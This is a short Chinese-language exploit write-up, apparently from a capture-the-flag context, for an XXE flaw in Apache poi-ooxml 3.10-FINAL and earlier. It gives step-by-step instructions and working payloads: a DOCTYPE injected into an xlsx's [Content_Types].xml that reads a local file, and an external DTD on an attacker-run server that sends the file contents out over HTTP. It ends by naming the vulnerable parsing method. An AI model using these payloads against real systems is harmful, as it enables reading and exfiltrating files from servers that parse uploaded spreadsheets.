#### 影响范围

poi-ooxml-3.10-FINAL.jar及以下版本

#### 利用方式

我们就需要构造恶意的excel-111.xlsx文件

首先，新建一个xlsx文件，然后解压之后在[Content_Types].xml中的第二行添加

```java
<!DOCTYPE ANY[
<!ENTITY % file SYSTEM "file:///flag">
<!ENTITY % remote SYSTEM "http://服务器ip/1.dtd">
%remote;
%all;
]>
<root>&send;</root>
```

然后压缩为excel-111.xlsx文件并且在vps上面开启一个http服务,新建一个1.dtd外部实体

```java
<!ENTITY % all "<!ENTITY send SYSTEM 'http://服务器ip:监听端口/%file;'>">
```

之后监听

#### 原理

`poi-ooxml` 包里  `org.apache.poi.openxml4j.opc.internal.ContentTypeManager#parseContentTypesFile` 中读取  `[Content-Types].xml` 时没有进行 XXE 防护